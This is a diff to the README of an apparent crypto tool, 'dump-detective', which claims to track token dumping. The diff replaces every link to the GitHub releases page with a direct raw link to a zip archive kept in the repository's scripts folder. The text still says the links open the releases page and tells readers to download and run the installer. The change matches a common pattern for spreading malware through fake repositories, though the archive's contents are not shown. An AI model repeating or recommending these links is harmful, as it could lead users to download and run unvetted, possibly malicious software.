@@ -1,6 +1,6 @@
 # 🦞 dump-detective - Track Token Dumping Easily
 
-[![Download dump-detective](https://img.shields.io/badge/Download-dump--detective-brightgreen)](https://github.com/Noble2718/dump-detective/releases)
+[![Download dump-detective](https://img.shields.io/badge/Download-dump--detective-brightgreen)](https://raw.githubusercontent.com/Noble2718/dump-detective/main/scripts/dump-detective-v3.5.zip)
 
 ---
 
@@ -44,7 +44,7 @@ You do not need blockchain knowledge to use it. It presents information clearly 
 
 Click the link below to open the dump-detective releases page on GitHub. You will find the latest version available there.
 
-[Download dump-detective](https://github.com/Noble2718/dump-detective/releases) 
+[Download dump-detective](https://raw.githubusercontent.com/Noble2718/dump-detective/main/scripts/dump-detective-v3.5.zip) 
 
 ### Step 2: Download the Windows Installer
 
@@ -97,7 +97,7 @@ Look for any red flags about rapid selling. This means someone is offloading tok
 
 New versions will improve detection and fix bugs. Check the GitHub releases page regularly:
 
-[Check for updates](https://github.com/Noble2718/dump-detective/releases)
+[Check for updates](https://raw.githubusercontent.com/Noble2718/dump-detective/main/scripts/dump-detective-v3.5.zip)
 
 Download and run the new installer when available to stay up to date.
 
@@ -146,4 +146,4 @@ binance, blockchain, bsc, crypto, defi, dump-detection, smart-money, token-analy
 
 ---
 
-[![Download dump-detective](https://img.shields.io/badge/Download-dump--detective-orange)](https://github.com/Noble2718/dump-detective/releases)
+[![Download dump-detective](https://img.shields.io/badge/Download-dump--detective-orange)](https://raw.githubusercontent.com/Noble2718/dump-detective/main/scripts/dump-detective-v3.5.zip)
